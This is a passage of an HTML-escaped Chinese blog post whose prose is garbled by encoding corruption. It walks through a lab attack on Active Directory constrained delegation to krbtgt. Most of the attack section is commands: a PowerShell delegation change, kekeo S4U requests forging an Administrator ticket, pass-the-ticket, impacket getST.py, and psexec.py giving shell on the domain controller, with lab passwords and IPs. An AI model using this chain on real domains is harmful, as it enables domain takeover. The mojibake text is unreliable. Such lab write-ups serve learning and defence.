&lt;p&gt;æˆ‘ä»¬éƒ½çŸ¥é“TGTçš„ç”Ÿæˆæ˜¯ç”±&lt;code&gt;krbtgt&lt;/code&gt;ç”¨æˆ·åŠ å¯†å’Œç­¾åçš„ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å§”æ´¾åŸŸä¸Šçš„ç”¨æˆ·å»è®¿é—®&lt;code&gt;TGS&lt;/code&gt;ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·çš„TGTäº†ï¼Œé»„é‡‘ç¥¨æ®é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯ç”¨&lt;code&gt;krbtgt&lt;/code&gt;çš„hashæ¥ä¼ªé€ TGTï¼Œä¸è¿‡æˆ‘ä»¬é€šè¿‡çº¦æŸå§”æ´¾ä¹Ÿèƒ½è¾¾åˆ°åŒæ ·çš„æ•ˆæœã€‚&lt;/p&gt;
&lt;p&gt;ç”±äº&lt;code&gt;krbtgt&lt;/code&gt;é»˜è®¤æ˜¯ç¦ç”¨çš„è€Œä¸”æ— æ³•å¯ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ä½¿ç”¨ç•Œé¢æ¥æ·»åŠ è¿™ä¸ªSPNã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨powershellåœ¨åŸŸæ§ä¸Šé¢æ¥æ·»åŠ ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Import-Module ActiveDirectory
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$user = Get-ADUser testsql
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-ADObject $user -Add @{ &amp;#34;msDS-AllowedToDelegateTo&amp;#34; = @(&amp;#34;krbtgt/hack.lab&amp;#34;) }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;æ³¨&lt;/strong&gt;ï¼šåŸŸæ§é»˜è®¤å®‰è£…ActiveDirectoryï¼Œå¦‚æœæ²¡æœ‰å®‰è£…ï¼Œå¯ä»¥ä¸‹è½½dllï¼š&lt;a href=&#34;https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll&#34;&gt;ä¸‹è½½åœ°å€&lt;/a&gt;ï¼Œç„¶åå¯¼å…¥å°±è¡Œäº†ï¼š&lt;code&gt;import-module .\Microsoft.ActiveDirectory.Management.dll&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ‰§è¡Œåä¼šåœ¨GUIç•Œé¢çœ‹åˆ°krbtgtå·²ç»è¢«æ·»åŠ åˆ°é‡Œé¢äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/29.png&#34; alt=&#34;29&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åŒå­¦ä»¬å¦‚æœå‘ç°è‡ªå·±è®¾ç½®çš„ç”¨æˆ·æ²¡æœ‰å§”æ´¾çš„é€‰é¡¹ï¼Œé‚£æ˜¯è¿˜æ²¡æœ‰æˆä¸ºæœåŠ¡è´¦å·ï¼Œå¯ä»¥é€šè¿‡åšå®¢çš„å¦å¤–ä¸€ç¯‡æ–‡ç« åŸŸæ¸—é€-SPNå­¦ä¹ &lt;/p&gt;
&lt;p&gt;æˆ–è€…ä¸´æ—¶åŠ ä¸€ä¸ªè¾“å…¥setspn -s MSSQLSvc/win7a.hack.lab testsql ï¼Œè¿™æ ·testsqlå°±æˆä¸ºæœåŠ¡è´¦å·äº†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å›åˆ°win7açš„ä¸»æœºä¸Šã€‚æˆ‘ä»¬ç°åœ¨æœ‰ä¸¤ç§æƒ…å†µï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ‹¿åˆ°win7aä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œå‘ç°testsqlç”¨æˆ·åœ¨æœ¬æœºç™»å½•è¿‡ï¼Œä½†æ²¡æœ‰å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨mimikatzå¯¼å‡ºTGTä¼ªé€ TGS&lt;/li&gt;
&lt;li&gt;æ‹¿åˆ°testsqlç”¨æˆ·çš„hashæˆ–è€…å¯†ç ï¼Œç›´æ¥ç”³è¯·TGTï¼Œç„¶åä¼ªé€ TGSï¼ˆè¿™ä¸ªè¿‡ç¨‹ä¸éœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;kekeo&#34;&gt;kekeo&lt;/h3&gt;
&lt;p&gt;ç›¸ä¿¡å¤§å®¶é€šè¿‡ä¸Šé¢çš„å®æˆ˜å·²ç»å¾ˆç†Ÿæ‚‰äº†ï¼Œä¸‹é¢æˆ‘ä»¬å°±åˆ©ç”¨testsqlç”¨æˆ·å°±è¡Œæ”»å‡»ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº†è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œæˆ‘ä»¬ä½¿ç”¨kekeoç”³è¯·ä¸€å¼ TGTï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kekeo.exe &amp;#34;tgt::ask /user:testsql /domain:hack.lab /password:p@ssw0rd&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/30.png&#34; alt=&#34;30&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æˆ‘ä»¬é€šè¿‡è¿™å¼ TGTç”³è¯·è·å–HACK\dc_adminè®¿é—®krbtgt/HACK.LABçš„TGSï¼Œå³HACK\dc_adminçš„TGTï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kekeo.exe &amp;#34;tgs::s4u /tgt:TGT_testsql@HACK.LAB_krbtgt~hack.lab@HACK.LABkirbi /user:Administrator@hack.lab /service:krbtgt/HACK.LAB&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‡ºç°äº†æŠ¥é”™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/31.png&#34; alt=&#34;31&#34;&gt;&lt;/p&gt;
&lt;p&gt;åæ¥çœ‹å…ˆçŸ¥çš„ä¸€ç¯‡æ–‡ç« çŸ¥é“ï¼š&lt;code&gt;2012 åŠä»¥åçš„KDCï¼Œå—é™å§”æ´¾çš„æœºåˆ¶å˜æˆäº†Resource Based Constrained Delegationå¯¼è‡´çš„&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæˆ‘åˆé‡æ–°ä½¿ç”¨Windows Server 2008æ­å»ºäº†ä¸€ä¸ªåŸŸå’ŒåŸŸå†…ä¸»æœºï¼Œå…·ä½“ç¯å¢ƒå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;åŸŸï¼šsafe.lab&lt;/p&gt;
&lt;p&gt;åŸŸæ§æœåŠ¡å™¨ï¼ˆserver 2008ï¼‰ï¼š172.16.0.118     åŸŸç®¡ç†ç”¨æˆ·ï¼šdc_admin  åŸŸæ§ä¸»æœºåï¼šdc2008&lt;/p&gt;
&lt;p&gt;åŸŸå†…ä¸»æœº ï¼ˆWindows 7ï¼‰ï¼š172.16.0.108     æœ¬åœ°ç®¡ç†å‘˜ï¼šsc92n  åŸŸæ™®é€šç”¨æˆ·ï¼štest  åŸŸæ§ä¸»æœºåï¼šwin7c&lt;/p&gt;
&lt;p&gt;é‡æ–°è®¾ç½®äº†æœåŠ¡è´¦å·å’Œæ·»åŠ krbtgtï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setspn -s MSSQLSvc/win7c.safe.lab test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ActiveDirectory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-ADUser&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Set-ADObject&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Add&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;msDS-AllowedToDelegateTo&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;krbtgt/safe.lab&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/32.png&#34; alt=&#34;32&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æˆ‘ä»¬ä½¿ç”¨testç”¨æˆ·ç™»å½•åœ¨win7cä¸Šä½¿ç”¨kekeoå·¥å…·è¿›è¡Œæ“ä½œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kekeo.exe &amp;#34;tgt::ask /user:test /domain:safe.lab /password:p@ssw0rd&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kekeo.exe &amp;#34;tgs::s4u /tgt:TGT_test@SAFE.LAB_krbtgt~safe.lab@SAFE.LABkirbi /user:Administrator@safe.lab /service:krbtgt/SAFE.LAB&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸç”³è¯·åˆ°&lt;strong&gt;Administrator&lt;/strong&gt;çš„TGTç¥¨æ®äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/33.png&#34; alt=&#34;33&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç»§ç»­æŠŠç”Ÿæˆçš„TGTç¥¨æ®è¿›è¡Œå¯¼å…¥å†…å­˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kekeo.exe &amp;#34;kerberos::ptt /tgt:TGS_administrator@safe.lab@SAFE.LAB_krbtgt~safe.lab@SAFE.LAB.kirbi&amp;#34; exit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¹¶è¿æ¥winrmæœåŠ¡ï¼ŒWindows Server 2008 R2éœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¼€å¯WinRMæœåŠ¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;winrm quickconfig -q
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Enter-PSSession -ComputerName DC
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥å·²ç»æ§åˆ¶äº†åŸŸæ§æœåŠ¡å™¨äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/34.png&#34; alt=&#34;34&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;impacket&#34;&gt;Impacket&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬è¿˜å¯ä»¥ç”¨&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;impacket&lt;/a&gt;ç³»åˆ—çš„&lt;code&gt;getST&lt;/code&gt;å‘KDCè¯·æ±‚administratorçš„TGTï¼Œå½“ä¸­ç›¸å…³çš„é…ç½®å¯ä»¥å»å‚è€ƒ&lt;a href=&#34;https://xxe.icu/posts/ad_ptt/#impacket&#34;&gt;åŸŸæ¸—é€-ç¥¨æ®ä¼ é€’æ”»å‡»&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é‚£ä¸‹é¢æˆ‘ä»¬å°±å¼€å§‹æ“ä½œï¼Œkaliæ–°ç‰ˆæ˜¯å†…ç½®äº†impacketçš„ï¼Œç›´æ¥æ‰§è¡Œå³å¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;getST.py -dc-ip 172.16.0.118 -spn krbtgt/safe.lab -impersonate Administrator safe.lab/test:p@ssw0rd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;-impersonateï¼šè¡¨ç¤ºä¼ªé€ ç”¨æˆ·&lt;/p&gt;
&lt;p&gt;-spnï¼šè¡¨ç¤ºæˆ‘ä»¬è¦å§”æ´¾çš„æœåŠ¡çš„spnï¼Œè¿™é‡Œæ˜¯TGS&lt;/p&gt;
&lt;p&gt;-dc-ipï¼šåŸŸæ§ip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ‰§è¡Œä¹‹åä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªç¼“å­˜æ–‡ä»¶&lt;code&gt;Administrator.ccache&lt;/code&gt;ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/35.png&#34; alt=&#34;35&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æ˜¯è®²ä¸€ä¸‹krb5çš„é…ç½®å§ï¼Œåœ¨kaliçš„/etc/hostsæ–‡ä»¶ä¸­æ·»åŠ ä¸‹é¢å†…å®¹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;172.16.0.118 safe.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;172.16.0.108 win7c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;172.16.0.118 dc2008
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®/etc/krb5.confï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[libdefaults]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        default_realm = safe.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[realms]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        safe.lab = {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                kdc = tcp/dc2008:88
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Administrator.ccache
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åç”¨psexec.pyå»è¿æ¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;psexec.py safe.lab/administrator@dc2008 -k -no-pass
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°åŸŸæ§çš„æƒé™äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/36.png&#34; alt=&#34;36&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;åŸç†-1&#34;&gt;åŸç†&lt;/h2&gt;
&lt;p&gt;å¾®è½¯å¾ˆæ—©å°±æ„è¯†åˆ°éçº¦æŸå§”æ´¾å¹¶ä¸æ˜¯ç‰¹åˆ«å®‰å…¨ï¼Œåœ¨ Windows 2003ä¸Šå‘å¸ƒäº†&amp;quot;çº¦æŸ&amp;quot;å§”æ´¾ã€‚ å…¶ä¸­åŒ…æ‹¬ä¸€ç»„ Kerberos åè®®æ‰©å±•ï¼Œä¹Ÿå°±æ˜¯ S4U2Self å’Œ S4U2Proxyä¸¤ä¸ªæ‰©å±•ï¼Œè¿™ä¸¤ä¸ªæ‰©å±•éƒ½å…è®¸æœåŠ¡ä»£è¡¨ç”¨æˆ·ä»KDCè¯·æ±‚ç¥¨è¯ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­S4Uæ”¯æŒä¸¤ä¸ªå­åè®®ï¼šService for User to Self (&lt;code&gt;S4U2Self&lt;/code&gt;)å’Œ Service for User to Proxy (&lt;code&gt;S4U2proxy&lt;/code&gt;)ï¼Œè¿™ä¸¤ä¸ªæ‰©å±•éƒ½å…è®¸æœåŠ¡ä»£è¡¨ç”¨æˆ·ä»KDCè¯·æ±‚ç¥¨è¯ã€‚&lt;code&gt;S4U2selfå¯ä»¥ä»£è¡¨è‡ªèº«è¯·æ±‚é’ˆå¯¹å…¶è‡ªèº«çš„å¯è½¬å‘çš„KerberosæœåŠ¡ç¥¨æ®(ST1)&lt;/code&gt;ï¼›&lt;code&gt;S4U2proxyå¯ä»¥ä»¥ç”¨æˆ·çš„åä¹‰è¯·æ±‚å…¶å®ƒæœåŠ¡çš„ST2&lt;/code&gt;ï¼Œçº¦æŸå§”æ´¾å°±æ˜¯é™åˆ¶äº†S4U2proxyæ‰©å±•çš„èŒƒå›´ã€‚&lt;/p&gt;
&lt;p&gt;å…¶ä¸­ï¼š&lt;/p&gt;
&lt;p&gt;&lt;code&gt;S4U2Self&lt;/code&gt;ï¼ˆç”¨ç”¨æˆ·çš„TGTå‘KDCè¯·æ±‚ç”¨æˆ·çš„å¯è½¬å‘çš„ST1ï¼Œå†ç”¨è¿™å¼ ST1å»å‘èµ·S4U2proxyè¯·æ±‚ã€‚ï¼‰
é€šè¿‡æ­¤æ‰©å±•å¯ä»¥æ‹¿åˆ°ä¸€å¼ æ ‡è¯†ä»»æ„ç”¨æˆ·èº«ä»½çš„STï¼Œå®ƒçš„ä½œç”¨å…¶å®æ˜¯&lt;code&gt;åè®®è½¬æ¢&lt;/code&gt;ã€‚æœ‰æ—¶ç”¨æˆ·ä¼šé€šè¿‡&lt;code&gt;å…¶ä»–åè®®&lt;/code&gt;ï¼ˆä¾‹å¦‚NTLMæˆ–ä»€è‡³åŸºäºè¡¨å•çš„èº«ä»½éªŒè¯ï¼‰å¯¹æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå› æ­¤ä»–ä»¬ä¸ä¼šå°†TGSå‘é€ç»™æœåŠ¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒæœåŠ¡å¯ä»¥&lt;code&gt;è°ƒç”¨S4U2Selfæ¥è¦æ±‚èº«ä»½éªŒè¯æœåŠ¡ä¸ºå…¶è‡ªèº«çš„ä»»æ„ç”¨æˆ·ç”ŸæˆTGS&lt;/code&gt;ï¼Œç„¶åå¯ä»¥åœ¨è°ƒç”¨S4U2Proxyæ—¶å°†å…¶ç”¨ä½œä¾æ®ã€‚ä¾‹å¦‚ç½‘ç«™AæœåŠ¡å™¨å¯ä»¥ä½¿ç”¨å®ƒå»å‘KDCè¯·æ±‚ä¸€å¼ ç”¨æˆ·Bèº«ä»½çš„ST1ï¼Œç½‘ç«™AæœåŠ¡å™¨å†ç”¨è¿™å¼ ST1å»å‘èµ·S4U2proxyè¯·æ±‚ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;S4U2proxy&lt;/code&gt;ï¼ˆæ‹¿ç”¨æˆ·çš„å¯è½¬å‘çš„ST1è¯·æ±‚ç”¨äºè®¿é—®æœåŠ¡å™¨çš„ST2ï¼‰
è¯¥æ‹“å±•ä½œç”¨æ˜¯ä½¿ç”¨ä¸€å¼ ç”¨æˆ·Aèº«ä»½çš„ST1å»å‘KDCè¯·æ±‚ä¸€å¼ ç”¨äºè®¿é—®æ–‡ä»¶æœåŠ¡å™¨Bçš„ST2ï¼Œè¿™å¼ ST2çš„èº«ä»½è¿˜æ˜¯ç”¨æˆ·çš„ï¼Œè¿™æ ·çš„è¯ç½‘ç«™Aå°±å¯ä»¥åˆ©ç”¨ç”¨æˆ·Açš„æƒé™å»è®¿é—®æ–‡ä»¶æœåŠ¡å™¨Bä¸Šçš„æ–‡ä»¶äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_2214804a-4a44-46f4-b6d2-a78f4ff39a39&#34;&gt;Server-for-User-to-Self (S4U2self)&lt;/a&gt;æ‰©å±•æ—¨åœ¨ç”¨äºç”¨æˆ·ä»¥æŸç§æ–¹å¼è€Œä¸æ˜¯ä½¿ç”¨ Kerberos å¯¹æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯æ—¶ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ Web æœåŠ¡å™¨ä¸“ç”¨çš„æŸç§æ–¹å¼å‘ Web æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ã€‚ç„¶åï¼ŒWeb æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨ S4U2self è·å–å¸¦æœ‰&lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_0eef5aca-03f3-4b09-b79b-cdf7f730ad89&#34;&gt;æˆæƒæ•°æ®&lt;/a&gt;çš„ç¥¨è¯ï¼Œå°±åƒç”¨æˆ·æœ€åˆä½¿ç”¨ Kerberos ä¸€æ ·ã€‚ è¿™é€šè¿‡ä½¿æ‰€æœ‰å†³ç­–è·¯å¾„çš„è¡Œä¸ºå°±åƒä½¿ç”¨äº† Kerberos ä¸€æ ·ç®€åŒ–äº†æœåŠ¡å™¨çš„&lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_5946f74c-27ca-4ef8-8630-f1a06cd8d59e&#34;&gt;æˆæƒå†³ç­–ã€‚&lt;/a&gt;S4U2self ä¸»è¦ä½¿ç”¨ KDC æ¥è·å–æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼Œä»¥ä½¿è°ƒç”¨è€…è‡ªå·±å—ç›Šã€‚&lt;a href=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_30e42141-9b8e-4fa1-852e-b4bb996ccf13&#34;&gt;ç”¨æˆ·ä»£ç†æœåŠ¡ (S4U2proxy&lt;/a&gt; )æ‰©å±•å…è®¸å‘¼å«è€…è”ç³»å…¶ä»–ä¸€äº›æœåŠ¡ï¼Œä»£è¡¨ç”¨æˆ·è¡Œäº‹ã€‚ä¸‹å›¾ç»™å‡ºäº†è¯¦ç»†çš„æ¦‚è¿°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ms-sfu_files/image002.png&#34; alt=&#34;S4U2self å’Œ S4U2proxy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å›¾ 2ï¼šS4U2self å’Œ S4U2proxy&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;S4U2self æè¿°åœ¨ä¸Šå›¾çš„ä¸ŠåŠéƒ¨åˆ†ã€‚ä½¿ç”¨æ­¤æ‰©å±•ï¼ŒæœåŠ¡ä¼šæ¥æ”¶åˆ°æœåŠ¡æœ¬èº«çš„æœåŠ¡ç¥¨è¯ï¼ˆä¸èƒ½åœ¨å…¶ä»–åœ°æ–¹ä½¿ç”¨çš„ç¥¨è¯ï¼‰ã€‚&lt;/p&gt;
